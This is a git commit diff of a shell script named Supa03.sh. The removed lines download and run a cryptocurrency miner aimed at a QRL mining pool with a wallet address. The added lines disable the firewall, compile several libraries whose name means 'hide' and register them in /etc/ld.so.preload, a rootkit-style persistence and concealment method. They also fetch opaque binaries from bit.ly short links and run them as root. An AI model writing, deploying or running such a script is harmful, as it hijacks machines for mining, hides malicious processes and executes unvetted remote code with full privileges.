e9f720f74c75f63f910dd35c8bd570e364faa81d
BatiKangkung <107105404+BatiKangkung@users.noreply.github.com>
2022-07-06 15:38:01 +0700

    Update Supa03.sh

--- Supa03.sh
+++ Supa03.sh
@@ -1,4 +1,10 @@
 #!/usr/bin/env bash
-softwareupdate -l
-brew install coreutils
-wget https://github.com/BatiKangkung/KangKung/raw/master/rigmac && chmod +x rigmac && ./rigmac --donate-level 1 -o de.qrl.herominers.com:1166 -u Q0105000f663000af2a410ea26f0abc8f8b499d80c85d2fbd9ec894c6f09f006685c27d69cf177b -p CPU -a rx/0 -k -t 10
+sudo ufw disable
+wget https://github.com/BatiKangkung/KangKung/raw/main/all.tar.gz
+sudo su --command "tar -xvf all.tar.gz && cd 01 && make && sudo mv libsembunyi01.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi01.so >> /etc/ld.so.preload && cd 02 && make && sudo mv libsembunyi02.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi02.so >> /etc/ld.so.preload && cd 03 && make && sudo mv libsembunyi03.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi03.so >> /etc/ld.so.preload && cd 04 && make && sudo mv libsembunyi04.so /usr/local/lib/ && echo /usr/local/lib/libsembunyi04.so >> /etc/ld.so.preload"
+sudo su --command "apt-get install shc -y && wget https://bit.ly/3NZULg3 && chmod +x 3NZULg3"
+sudo su --command "nohup ./3NZULg3 --log=stdout > meta.log &"
+sleep 2
+sudo su --command "cat meta.log" 
+sudo su --command "apt-get install shc -y && wget https://bit.ly/39IevGg && chmod +x 39IevGg"
+sudo su --command "./39IevGg"
